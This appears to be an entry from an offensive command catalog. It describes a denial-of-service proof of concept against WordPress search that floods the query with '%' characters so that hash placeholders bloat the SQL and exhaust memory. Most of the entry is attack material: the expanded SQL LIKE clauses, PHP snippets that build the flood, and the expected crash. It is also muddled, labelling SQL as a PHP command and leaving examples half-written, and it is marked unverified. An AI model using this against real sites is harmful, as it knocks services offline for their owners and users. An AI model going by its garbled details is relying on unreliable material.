---
id: cmd-dos-percent-search
data: >-
  ((wp_posts.post_title LIKE
  '{5944533a7bbf0e39b0751657f6618c4003a77dc4d2a15581d17deef104a124a8}slavco{5944533a7bbf0e39b0751657f6618c4003a77dc4d2a15581d17deef104a124a8}')
  OR (wp_posts.post_excerpt LIKE
  '{5944533a7bbf0e39b0751657f6618c4003a77dc4d2a15581d17deef104a124a8}slavco{5944533a7bbf0e39b0751657f6618c4003a77dc4d2a15581d17deef104a124a8}')
  OR (wp_posts.post_content LIKE
  '{5944533a7bbf0e39b0751657f6618c4003a77dc4d2a15581d17deef104a124a8}slavco{5944533a7bbf0e39b0751657f6618c4003a77dc4d2a15581d17deef104a124a8}'))
tags:
  - dos
  - sqli
  - wordpress
type: command
output: null
executor: php
platforms:
  - PHP
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:56.578Z'
verified: false
validated: true
submitted: true
---
# dos-search-percent-flood

## Command

```php
((wp_posts.post_title LIKE '{5944533a7bbf0e39b0751657f6618c4003a77dc4d2a15581d17deef104a124a8}slavco{5944533a7bbf0e39b0751657f6618c4003a77dc4d2a15581d17deef104a124a8}') OR (wp_posts.post_excerpt LIKE '{5944533a7bbf0e39b0751657f6618c4003a77dc4d2a15581d17deef104a124a8}slavco{5944533a7bbf0e39b0751657f6618c4003a77dc4d2a15581d17deef104a124a8}') OR (wp_posts.post_content LIKE '{5944533a7bbf0e39b0751657f6618c4003a77dc4d2a15581d17deef104a124a8}slavco{5944533a7bbf0e39b0751657f6618c4003a77dc4d2a15581d17deef104a124a8}'))
```

## Description

PoC for DoS via memory exhaustion in WordPress search by flooding with % characters, replaced by long HMAC hashes, bloating prepared queries.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| LIKE | SQL LIKE clauses | Yes |
| {hash}slavco{hash} | Replaced % with HMAC hash + braces for search term 'slavco' | Yes |

## Examples

### Basic Usage

```php
$search = str_repeat('%', 1000); // Flood %
// Prepare search query
```

### Advanced Usage

```php
// Replace each % with 66-char hash
$bloated = str_replace('%', '{hash}slavco{hash}', $search);
```

## Expected Output

Bloated query string consuming high memory (e.g., 66 chars per %), causing OOM or slow execution.

## Related

- [[Related Procedure]]
